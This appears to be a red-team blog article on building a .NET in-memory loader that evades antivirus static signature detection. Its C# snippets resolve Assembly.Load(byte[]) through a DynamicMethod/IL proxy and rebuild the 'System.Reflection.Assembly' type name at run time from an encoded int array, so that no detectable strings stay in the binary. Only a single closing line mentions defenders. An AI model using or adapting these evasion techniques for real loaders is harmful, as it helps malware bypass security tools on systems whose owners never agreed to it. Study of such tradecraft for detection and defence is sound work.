    Stealth In-Memory Loading

    Introduction

    It is no secret that modern antivirus solutions rely on both signature matching and behavioral heuristics to detect malicious files or suspicious Win32 API calls at runtime. In this article, I will discuss a few techniques that help obfuscate a malicious binary and bypass AV during red-team engagements. I will focus on static-analysis bypasses.

    In-Memory vs On-Disk

    An advanced red-team operator always tries to leave as little evidence as possible. Writing a known malicious binary directly to disk leaves a clear trail, so operators prefer using a “loader” that brings the payload into memory instead of persisting it on disk. But if the loader itself is a malicious binary, how can it avoid detection?

    Novel Signatures

    To slip past antivirus engines, the loader’s code must be novel—it cannot be a recycled stub or a widely shared proof-of-concept. Every function and routine should be reshaped so that hash-based or pattern-matching scanners won’t recognize it. Since these scanners often rely on databases of known malicious strings or function implementations, an effective loader mixes string obfuscation (transforming strings and decoding them at run time) with meaningless IL instructions to break up recognizable patterns.

    Avoiding Assembly.Load()

    Many AV engines flag direct calls to Assembly.Load. We can bypass this by resolving and invoking it dynamically at run time, so no static reference to Assembly.Load appears in plaintext. Instead of calling GetMethod() directly, we build a small runtime proxy to resolve GetMethod() and add padding to each call, making every invocation unique.

    1. DynamicMethod Creation  

    We first construct a DynamicMethod named "gm" that returns a MethodInfo and takes three parameters: the Type to reflect on, the string method name, and a Type[] describing the method’s parameter types. By specifying typeof(object).Module, the method is granted full trust to access public members across assemblies.  

    ```csharp

    var dm = new DynamicMethod(

    "gm",

    typeof(MethodInfo),

    new[] { typeof(Type), typeof(string), typeof(Type[]) },

    typeof(object).Module

    );

    ```

    1. Emitting IL Instructions  

    Using the ILGenerator, we emit exactly the IL needed to perform targetType.GetMethod(methodName, signatureTypes):  

    ```csharp

    il.Emit(OpCodes.Ldarg_0);   // push the Type instance

    il.Emit(OpCodes.Ldarg_1);   // push the method name string

    il.Emit(OpCodes.Ldarg_2);   // push the Type[] signature

    var sigGetMethod = typeof(Type)

    .GetMethod("GetMethod", new[] { typeof(string), typeof(Type[]) });

    il.EmitCall(OpCodes.Callvirt, sigGetMethod, null); // invoke GetMethod

    il.Emit(OpCodes.Ret);       // return the MethodInfo

    ```

    1. Resolving the Assembly Type  

    We never hard-code "System.Reflection.Assembly". Instead, after building our proxy delegate, we reconstruct that namespace string at run time (for example via getAsmBuff()) and call:  

    ```csharp

    var asmType = Type.GetType(new string(getAsmBuff()), throwOnError: false);

    ```

    1. Invoking Load(byte[])  

    Once we have asmType, we use our proxy to find and invoke the static Load(byte[]) method without ever embedding "Load" in clear text:  

    ```csharp

    var loadMethod = get(asmType, getLoadMethodName(), new[] { typeof(byte[]) });

    var asm = (Assembly)loadMethod.Invoke(null, new object[] { dllBytes });

    ```

    Obfuscating Strings

    To avoid hard-coding strings like "System.Reflection.Assembly", we can obfuscate them with a simple transformation rather than XOR (which AV engines often flag). For example, store each character code minus one in an int[], then rebuild the string in a helper:  

    private static readonly int[] codes = {

    'T' - 1, 'z' - 1, 't' - 1, 'u' - 1, 'f' - 1, 'n' - 1,

    '/' - 1, 'S' - 1, 'f' - 1, 'g' - 1, 'm' - 1, 'f' - 1,

    'd' - 1, 'u' - 1, 'j' - 1, 'p' - 1, 'o' - 1, '/' - 1,

    'B' - 1, 't' - 1, 't' - 1, 'f' - 1, 'n' - 1, 'c' - 1,

    'm' - 1, 'z' - 1

};



private static char[] getAsmBuff() {

    char[] buf = new char[codes.Length];

    for (int i = 0; i < buf.Length; i++)

        buf[i] = (char)codes[i];

    return buf;

}

    At run time, new string(getAsmBuff()) yields "System.Reflection.Assembly" without embedding it directly in the binary.

    Outro

    By combining dynamic API resolution, IL-level obfuscation, and run-time string decoding, this loader avoids static signatures and forces AV vendors to rely on expensive behavioral analysis instead of quick signature lookups. Understanding these techniques helps defenders tune their telemetry, improve memory-forensics capabilities, and stay one step ahead of sophisticated red-team tactics.
